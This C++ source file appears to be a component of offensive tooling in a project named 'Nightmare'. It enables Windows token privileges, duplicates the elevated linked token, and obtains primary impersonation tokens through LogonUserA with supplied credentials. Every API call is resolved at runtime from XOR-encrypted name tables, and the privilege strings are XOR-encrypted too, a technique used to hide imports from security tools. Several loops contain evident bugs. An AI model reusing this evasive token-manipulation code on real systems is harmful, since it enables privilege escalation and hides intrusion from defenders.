#include "pch.h"
#include "Privileges.h"
#include "DynLibResolver.h"
#include "Nightmare.h"

BOOL EnableWindowsPrivilege(CHAR* Privilege, HANDLE hCurrentProcess, bool bAssertAssigned)
{
	/* Tries to enable privilege if it is present to the Permissions set. */
	LUID luid = {};
	TOKEN_PRIVILEGES tp;
	HANDLE currentToken = {};
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!((fp_LookupPrivilegeValueA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]), 
			XorDecryptString(p_FunctionTable[FunctionEntry::_LookupPrivilegeValueA])))(NULL, Privilege, &luid)) return FALSE;

	if (!((fp_OpenProcessToken)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]), 
		XorDecryptString(p_FunctionTable[FunctionEntry::_OpenProcessToken])))(hCurrentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;

	if (!((fp_AdjustTokenPrivileges)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_AdjustTokenPrivileges])))(currentToken, 
																				   FALSE, 
																				   &tp, 
																				   sizeof(TOKEN_PRIVILEGES), 
																				   (PTOKEN_PRIVILEGES)NULL, 
																				   (PDWORD)NULL)) return FALSE;

	return bAssertAssigned ? GetLastError() != ERROR_NOT_ALL_ASSIGNED : TRUE;
}

BOOL CheckWindowsPrivilegeEnable(CHAR* Privilege, HANDLE hCurrentProcess)
{
	/* Checks for Privilege and returns True or False. */
	LUID luid;
	PRIVILEGE_SET privs;
	HANDLE hToken;
	if (!((fp_OpenProcessToken)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_OpenProcessToken])))(hCurrentProcess, TOKEN_QUERY, &hToken)) return FALSE;

	if (!((fp_LookupPrivilegeValueA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_LookupPrivilegeValueA])))(NULL, Privilege, &luid)) return FALSE;

	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bResult;
	((fp_PrivilegeCheck)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_PrivilegeCheck])))(hToken, &privs, &bResult);

	return bResult;
}

BOOL DuplicateCurrentProcessToken(PHANDLE hToken, HANDLE hCurrentProcess)
{
	DWORD dwTokenSize;
	HANDLE hCurrentProcessToken;
	TOKEN_LINKED_TOKEN lto;

	if (!((fp_OpenProcessToken)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_OpenProcessToken])))(hCurrentProcess, TOKEN_ALL_ACCESS, &hCurrentProcessToken)) return FALSE;

	if (!((fp_GetTokenInformation)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_GetTokenInformation])))(hCurrentProcessToken, TokenLinkedToken, &lto, sizeof(lto), &dwTokenSize)) return FALSE;

	if (!((fp_DuplicateTokenEx)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_DuplicateTokenEx])))(lto.LinkedToken,
																				TOKEN_ALL_ACCESS,
																				NULL,
																				SecurityImpersonation,
																				TokenPrimary,
																				hToken)) return FALSE;

report:

	return TRUE;
}

BOOL DecryptPrivilegeSet(PRequestPrilvilegeSet PrivSet)
{
	PRequestPrivilege i;
	for (i = PrivSet->Privilege; i != NULL;)
	{
		if (PrivSet->Privilege->pszDecryptedPrivilege == NULL)
		{

			PrivSet->Privilege->pszDecryptedPrivilege = XorDecryptStringExWithKey(PrivSet->Privilege->pEncryptedPrivilege->pEncryptedPrivilegeByte,
				PrivSet->Privilege->pEncryptedPrivilege->len, NULL, ENV_XOR_KEY);


		} 
		i = i->Next;
	}
	return TRUE;
}

BOOL DecryptPrivilege(PRequestPrivilege Priv)
{
	if (Priv->pszDecryptedPrivilege == NULL)
	{
		Priv->pszDecryptedPrivilege = XorDecryptStringExWithKey(Priv->pEncryptedPrivilege->pEncryptedPrivilegeByte,
			Priv->pEncryptedPrivilege->len, NULL, ENV_XOR_KEY);
	}
	return TRUE;
}

BOOL EnableRequestedPrivilege(PRequestPrilvilegeSet PrivSet, HANDLE hCurrentProcess, bool bAssertAssigned)
{
	PRequestPrivilege p;
	BOOL bRet = TRUE;
	for (p = PrivSet->Privilege; p != NULL;)
	{
		if (CheckWindowsPrivilegeEnable(PrivSet->Privilege->pszDecryptedPrivilege, hCurrentProcess))
		{
			goto next;
		}
		else
		{
			if (!EnableWindowsPrivilege(PrivSet->Privilege->pszDecryptedPrivilege, hCurrentProcess, bAssertAssigned))
			{
				bRet = FALSE;
			}
		}
	next:
		p = p->Next;
	}
	return bRet;
}

BOOL AddRequestPrivilege(PRequestPrilvilegeSet PrivSet, RequestPrivilegeType PrivType, HANDLE hCurrentProcessHeap)
{
	PRequestPrivilege p, tmp;

	p = PrivSet->Privilege;
	tmp = (PRequestPrivilege)((fp_HeapAlloc)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Kernel32]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_HeapAlloc])))(hCurrentProcessHeap, HEAP_ZERO_MEMORY, sizeof(RequestPrivilege));

	if (tmp == NULL && !(PrivType < RequestPrivilegeEntryLen && PrivType > 0)) return FALSE;

	tmp->Next = NULL;
	tmp->pEncryptedPrivilege = &privilege_raw[PrivType];

	if (PrivSet->Privilege == NULL)
	{
		PrivSet->Privilege = tmp;

		if (PrivSet->Privilege == NULL) return FALSE;

	}
	else
	{
		while (p->Next != NULL)
		{
			p = p->Next;
		}

		p->Next = tmp;
	}

	PrivSet->size++;

	return TRUE;
}

BOOL GetImpersonatePrimaryTokenFromUser(PHANDLE hToken, HANDLE hCurrentProcess, char* szUsername, char* szPassword, char* szDomainName)
{
	char* szTempDomainName;
	DWORD dwTokenSize;
	HANDLE hUserLogonToken;
	TOKEN_LINKED_TOKEN lto;

	//if we dont have domain name then we assume the user not joining any domain
	szTempDomainName = szDomainName == NULL ? szUsername : szDomainName;


	if (!((fp_LogonUserA)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_LogonUserA])))(szUsername, 
																				szTempDomainName, 
																				szPassword, 
																				LOGON32_LOGON_INTERACTIVE,
																				LOGON32_PROVIDER_DEFAULT, &hUserLogonToken)) return FALSE;
	//retrieve the unfiltered token handle
	if(!((fp_GetTokenInformation)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
			XorDecryptString(p_FunctionTable[FunctionEntry::_GetTokenInformation])))(hUserLogonToken, TokenLinkedToken, &lto, sizeof(lto), &dwTokenSize)) return FALSE;

	if (!((fp_DuplicateTokenEx)ResolveModuleFunction(XorDecryptString(p_ModuleTable[ModuleEntry::_Advapi]),
		XorDecryptString(p_FunctionTable[FunctionEntry::_DuplicateTokenEx])))(lto.LinkedToken,
																							TOKEN_ALL_ACCESS,
																							NULL,
																							SecurityImpersonation,
																							TokenPrimary,
																							hToken)) return FALSE;

	return TRUE;
}